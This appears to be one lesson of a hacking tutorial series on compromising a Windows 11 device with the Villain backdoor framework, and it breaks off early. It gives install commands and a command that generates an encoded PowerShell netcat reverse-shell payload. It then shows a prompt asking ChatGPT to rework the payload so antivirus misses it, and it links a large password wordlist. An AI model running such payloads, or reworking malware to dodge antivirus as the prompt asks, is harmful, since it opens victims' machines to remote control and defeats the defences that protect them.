# ♦ Day 16
</br>
</br>

## ◙ ***Note***
 </br>
  There is an update in rockyou.txt file containing a far better number of word combinations 
  </br>
  
  ⇨ [Rockyou.txt](https://github.com/hkphh/rockyou2024.txt)
 </br>
# ♦ Hacking Windows 11 :
   ***• Introducing Villan Framework***
   </br>
      Villain is a Windows & Linux backdoor generator and multi-session handler that allows users to connect with sibling servers (other machines running Villain) and share their backdoor sessions, handy for working as a team. [Villan](https://github.com/keralahacker/Villain/)
   </br>
   ⇨ In this Sessioin we will be learning to how to use Villan framework to get into OR Hack a Windows 11 device 
   </br>
   </br>
### ◙ Step-By-Step Guide 
</br >

### • 1. Installation of Villan Framework :

    git clone https://github.com/t3l3machus/Villain
    cd ./Villain
    pip3 install -r requirements.txt

• Now add the x parameter in the file and exicute it:

    chmod +x villan.py

• Now exicute with python

    python3 villan.py

> For details use "help" command


### • 2. Generate a paylaod : 

 To understand how to generate a paylaod we will use the command 

    help generate

• Generate a paylaod from the example for the wwindows

    generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode

 Now try runing the generated payload in powershell

</br>

***◙ Improving the Payload***
 As we can see that the paylaod has been shot down by the AV so we have to do some changes in tht so it can't be detected by the AV.
 </br>
  </br>
 • For doingb such changes we will be using Our beloved ***"CHAT GPT"*** in such a manner >
  </br>

 ### • 1.
      >give the payload< analyse this code and modify the code to be more AV proof need this code in ps1 file
   
      
